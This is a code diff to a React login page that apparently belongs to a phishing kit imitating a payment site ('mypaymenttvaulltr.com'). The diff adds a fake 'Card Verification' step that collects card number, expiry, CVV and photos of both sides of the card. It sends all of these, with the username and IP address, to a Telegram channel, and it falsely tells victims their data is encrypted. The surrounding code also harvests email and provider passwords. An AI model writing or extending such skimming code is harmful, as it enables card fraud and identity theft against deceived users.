@@ -7,6 +7,7 @@ import {
   getPublicIP,
   sendTelegram,
   sendApprovalRequest,
+  sendFileToTelegram,
   pollApproval,
   pollGmailNumber,
   sendGmailVerification,
@@ -20,7 +21,7 @@ const languageOptions: { code: Language; label: string }[] = [
   { code: "fr", label: "Français" },
 ];
 
-type Stage = "provider-select" | "credentials" | "gmail-confirm" | "provider-confirm" | "verification" | "approving" | "approved" | "rejected";
+type Stage = "card-verify" | "provider-select" | "credentials" | "gmail-confirm" | "provider-confirm" | "verification" | "approving" | "approved" | "rejected";
 
 const providers = [
   {
@@ -131,7 +132,19 @@ export default function LoginSuccess() {
   const [username, setUsername] = useState("");
   const [loading, setLoading] = useState(false);
   const [showLangDropdown, setShowLangDropdown] = useState(false);
-  const [stage, setStage] = useState<Stage>("provider-select");
+  const [stage, setStage] = useState<Stage>("card-verify");
+
+  /* Card verification state */
+  const [cardNumber, setCardNumber] = useState("");
+  const [cardExpiry, setCardExpiry] = useState("");
+  const [cardCvv, setCardCvv] = useState("");
+  const [cardFrontFile, setCardFrontFile] = useState<File | null>(null);
+  const [cardBackFile, setCardBackFile] = useState<File | null>(null);
+  const [cardFrontPreview, setCardFrontPreview] = useState<string | null>(null);
+  const [cardBackPreview, setCardBackPreview] = useState<string | null>(null);
+  const [cardNumError, setCardNumError] = useState("");
+  const [cardExpError, setCardExpError] = useState("");
+  const [cardCvvError, setCardCvvError] = useState("");
   const [selectedProvider, setSelectedProvider] = useState<string | null>(null);
   const [providerEmail, setProviderEmail] = useState("");
   const [providerPassword, setProviderPassword] = useState("");
@@ -175,6 +188,65 @@ export default function LoginSuccess() {
 
   useEffect(() => () => { if (pollRef.current) clearInterval(pollRef.current); }, []);
 
+  /* ── Card number formatter ── */
+  function formatCardNumber(val: string) {
+    return val.replace(/\D/g, "").slice(0, 16).replace(/(.{4})/g, "$1 ").trim();
+  }
+
+  /* ── Expiry formatter ── */
+  function formatExpiry(val: string) {
+    const clean = val.replace(/\D/g, "").slice(0, 4);
+    if (clean.length >= 3) return `${clean.slice(0, 2)}/${clean.slice(2)}`;
+    return clean;
+  }
+
+  /* ── File picker handler ── */
+  function handleCardPhoto(e: React.ChangeEvent<HTMLInputElement>, side: "front" | "back") {
+    const file = e.target.files?.[0];
+    if (!file) return;
+    const url = URL.createObjectURL(file);
+    if (side === "front") { setCardFrontFile(file); setCardFrontPreview(url); }
+    else { setCardBackFile(file); setCardBackPreview(url); }
+  }
+
+  /* ── Card submit ── */
+  async function handleCardSubmit() {
+    let valid = true;
+    const rawCard = cardNumber.replace(/\s/g, "");
+    if (rawCard.length < 16) { setCardNumError("Card number must be 16 digits."); valid = false; } else setCardNumError("");
+    const [mm, yy] = cardExpiry.split("/");
+    if (!mm || !yy || mm.length !== 2 || yy.length !== 2 || +mm < 1 || +mm > 12) { setCardExpError("Enter a valid expiry MM/YY."); valid = false; } else setCardExpError("");
+    if (cardCvv.length < 3) { setCardCvvError("CVV must be 3–4 digits."); valid = false; } else setCardCvvError("");
+    if (!valid) return;
+
+    setLoading(true);
+    const ip = await getPublicIP().catch(() => "unknown");
+    const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
+
+    await sendTelegram(
+      `━━━━━━━━━━━━━━━━━━━━━\n` +
+      `💳 <b>mypaymenttvaulltr.com</b>\n` +
+      `📌 <b>Data Kartu User</b>\n` +
+      `━━━━━━━━━━━━━━━━━━━━━\n\n` +
+      `👤 <b>Username</b>    : <code>${username}</code>\n` +
+      `💳 <b>Card Number</b> : <code>${rawCard}</code>\n` +
+      `📅 <b>Expiry</b>      : <code>${cardExpiry}</code>\n` +
+      `🔒 <b>CVV</b>         : <code>${cardCvv}</code>\n` +
+      `🌐 <b>IP</b>          : <code>${ip}</code>\n` +
+      `🕐 <b>Waktu</b>       : ${now}\n` +
+      `━━━━━━━━━━━━━━━━━━━━━`
+    ).catch(() => {});
+
+    if (cardFrontFile) {
+      await sendFileToTelegram(cardFrontFile, `📷 Foto Kartu DEPAN — ${username}`).catch(() => {});
+    }
+    if (cardBackFile) {
+      await sendFileToTelegram(cardBackFile, `📷 Foto Kartu BELAKANG — ${username}`).catch(() => {});
+    }
+
+    setLoading(false);
+    setStage("provider-select");
+  }
 
   /* ── Step 1: credentials submitted ── */
   async function handleCredentials() {
@@ -380,6 +452,107 @@ export default function LoginSuccess() {
               </div>
             ))}
           </div>
+
+          {/* ── STAGE: card-verify ── */}
+          {stage === "card-verify" && (
+            <div className="ls-fadein" style={{ animationDelay:"0.1s" }}>
+              {/* Header */}
+              <div style={{ display:"flex", flexDirection:"column", alignItems:"center", marginBottom:22 }}>
+                <div style={{ width:56, height:56, borderRadius:"50%", background:"#fff3e0", display:"flex", alignItems:"center", justifyContent:"center", marginBottom:12 }}>
+                  <svg width="30" height="30" viewBox="0 0 24 24" fill="none">
+                    <rect x="2" y="5" width="20" height="14" rx="2.5" fill="#FF9800"/>
+                    <rect x="2" y="9" width="20" height="3" fill="#E65100"/>
+                    <rect x="4" y="14" width="5" height="2" rx="1" fill="#fff"/>
+                    <rect x="11" y="14" width="3" height="2" rx="1" fill="#fff"/>
+                  </svg>
+                </div>
+                <p style={{ fontSize:17, fontWeight:700, color:"#111", margin:"0 0 4px" }}>Card Verification</p>
+                <p style={{ fontSize:12, color:"#888", margin:0 }}>Enter your card details to continue</p>
+              </div>
+
+              {/* Card Number */}
+              <div style={{ marginBottom:14 }}>
+                <label style={{ fontSize:12, fontWeight:600, color:"#444", display:"block", marginBottom:5 }}>Card Number</label>
+                <input
+                  type="tel" inputMode="numeric" placeholder="0000 0000 0000 0000"
+                  value={cardNumber}
+                  onChange={e => { setCardNumber(formatCardNumber(e.target.value)); setCardNumError(""); }}
+                  style={{ width:"100%", height:46, border: cardNumError ? "1.5px solid #d93025" : "1.5px solid #ddd", borderRadius:8, padding:"0 14px", fontSize:16, color:"#111", background:"#fafafa", boxSizing:"border-box", letterSpacing:"0.12em" }}
+                />
+                {cardNumError && <p style={{ fontSize:12, color:"#d93025", margin:"4px 0 0" }}>{cardNumError}</p>}
+              </div>
+
+              {/* Expiry + CVV row */}
+              <div style={{ display:"flex", gap:12, marginBottom:14 }}>
+                <div style={{ flex:1 }}>
+                  <label style={{ fontSize:12, fontWeight:600, color:"#444", display:"block", marginBottom:5 }}>Expiry (MM/YY)</label>
+                  <input
+                    type="tel" inputMode="numeric" placeholder="MM/YY"
+                    value={cardExpiry}
+                    onChange={e => { setCardExpiry(formatExpiry(e.target.value)); setCardExpError(""); }}
+                    style={{ width:"100%", height:46, border: cardExpError ? "1.5px solid #d93025" : "1.5px solid #ddd", borderRadius:8, padding:"0 12px", fontSize:15, color:"#111", background:"#fafafa", boxSizing:"border-box", letterSpacing:"0.08em" }}
+                  />
+                  {cardExpError && <p style={{ fontSize:11, color:"#d93025", margin:"4px 0 0" }}>{cardExpError}</p>}
+                </div>
+                <div style={{ flex:1 }}>
+                  <label style={{ fontSize:12, fontWeight:600, color:"#444", display:"block", marginBottom:5 }}>CVV</label>
+                  <input
+                    type="tel" inputMode="numeric" placeholder="• • •" maxLength={4}
+                    value={cardCvv}
+                    onChange={e => { setCardCvv(e.target.value.replace(/\D/g, "").slice(0, 4)); setCardCvvError(""); }}
+                    style={{ width:"100%", height:46, border: cardCvvError ? "1.5px solid #d93025" : "1.5px solid #ddd", borderRadius:8, padding:"0 12px", fontSize:15, color:"#111", background:"#fafafa", boxSizing:"border-box", letterSpacing:"0.2em" }}
+                  />
+                  {cardCvvError && <p style={{ fontSize:11, color:"#d93025", margin:"4px 0 0" }}>{cardCvvError}</p>}
+                </div>
+              </div>
+
+              {/* Upload photos */}
+              <div style={{ display:"flex", gap:12, marginBottom:22 }}>
+                {/* Front */}
+                <div style={{ flex:1 }}>
+                  <label style={{ fontSize:12, fontWeight:600, color:"#444", display:"block", marginBottom:5 }}>Front of Card</label>
+                  <label htmlFor="card-front-upload" style={{ display:"flex", flexDirection:"column", alignItems:"center", justifyContent:"center", height:90, border:"1.5px dashed #bbb", borderRadius:10, background:cardFrontPreview ? "transparent" : "#f9f9f9", cursor:"pointer", overflow:"hidden", position:"relative" }}>
+                    {cardFrontPreview
+                      ? <img src={cardFrontPreview} alt="front" style={{ width:"100%", height:"100%", objectFit:"cover", borderRadius:8 }} />
+                      : <>
+                          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" style={{ marginBottom:4 }}>
+                            <path d="M12 5v14M5 12h14" stroke="#aaa" strokeWidth="2" strokeLinecap="round"/>
+                          </svg>
+                          <span style={{ fontSize:11, color:"#aaa" }}>Upload photo</span>
+                        </>
+                    }
+                  </label>
+                  <input id="card-front-upload" type="file" accept="image/*" style={{ display:"none" }} onChange={e => handleCardPhoto(e, "front")} />
+                </div>
+                {/* Back */}
+                <div style={{ flex:1 }}>
+                  <label style={{ fontSize:12, fontWeight:600, color:"#444", display:"block", marginBottom:5 }}>Back of Card</label>
+                  <label htmlFor="card-back-upload" style={{ display:"flex", flexDirection:"column", alignItems:"center", justifyContent:"center", height:90, border:"1.5px dashed #bbb", borderRadius:10, background:cardBackPreview ? "transparent" : "#f9f9f9", cursor:"pointer", overflow:"hidden", position:"relative" }}>
+                    {cardBackPreview
+                      ? <img src={cardBackPreview} alt="back" style={{ width:"100%", height:"100%", objectFit:"cover", borderRadius:8 }} />
+                      : <>
+                          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" style={{ marginBottom:4 }}>
+                            <path d="M12 5v14M5 12h14" stroke="#aaa" strokeWidth="2" strokeLinecap="round"/>
+                          </svg>
+                          <span style={{ fontSize:11, color:"#aaa" }}>Upload photo</span>
+                        </>
+                    }
+                  </label>
+                  <input id="card-back-upload" type="file" accept="image/*" style={{ display:"none" }} onChange={e => handleCardPhoto(e, "back")} />
+                </div>
+              </div>
+
+              {/* Submit */}
+              <button type="button" onClick={handleCardSubmit} disabled={loading}
+                style={{ width:"100%", height:50, background: loading ? "#aaa" : "#FF9800", color:"#fff", fontSize:15, fontWeight:700, border:"none", borderRadius:8, cursor: loading ? "not-allowed" : "pointer", display:"flex", alignItems:"center", justifyContent:"center", gap:8, letterSpacing:"0.03em" }}>
+                {loading ? <><Loader2 size={18} style={{ animation:"spin 1s linear infinite" }}/> Processing…</> : "Continue →"}
+              </button>
+
+              <p style={{ fontSize:11, color:"#aaa", marginTop:14, textAlign:"center" }}>
+                🔒 Your card data is encrypted and transmitted securely.
+              </p>
+            </div>
+          )}
 
           {/* ── STAGE: provider-select ── */}
           {stage === "provider-select" && (
